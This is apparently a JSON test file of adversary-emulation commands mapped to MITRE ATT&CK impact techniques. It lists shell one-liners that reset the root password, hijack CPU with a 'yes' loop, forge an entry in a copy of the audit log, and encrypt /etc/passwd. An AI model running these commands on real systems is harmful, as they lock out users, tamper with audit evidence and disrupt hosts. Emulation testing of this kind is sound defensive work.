{
  "commands": [
   {
      "tactic_id": "T1531 ",
      "technique": "Account Access Removal",
      "command": "echo \"Sputnik:root@123\" | sudo chpasswd"
    },
    {
      "tactic_id": "T1496 ",
      "technique": "Resource Hijacking",
      "command": "yes > /dev/null &YES_PID=$!\necho PID of yes command: $YES_PID\nsleep 10\nkill $YES_PID"
    },    
    {
      "tactic_id": "T1485 ",
      "technique": "Data Destruction using dd",
      "command": "cp /var/log/audit/audit.log /tmp/audit_copy.log; EPOCH_TIME=$(date +%s.%3N); TMP_ENTRY=\"/tmp/new_execve_entry.log\"; MANIPULATED_LOG=\"/tmp/audit_copy.log\"; echo \"type=EXECVE msg=audit($EPOCH_TIME:Sputnik) argc=2 a0=\\\"hostname\\\" a1=\\\"-I\\\"\" > \"$TMP_ENTRY\"; cat \"$TMP_ENTRY\" >> \"$MANIPULATED_LOG\"; FILE_SIZE=$(stat -c%s \"$MANIPULATED_LOG\"); dd if=\"$MANIPULATED_LOG\" of=\"$MANIPULATED_LOG\" bs=1 count=\"$FILE_SIZE\" conv=notrunc"
    },  
    {
      "tactic_id": "T1486 ",
      "technique": "Data Encrypted for Impact",
      "command": "PASS=$(hostname)\ngpg --batch --yes --passphrase $PASS -c -o Output/Impact/passwd.gpg /etc/passwd"
    }
  ]
}

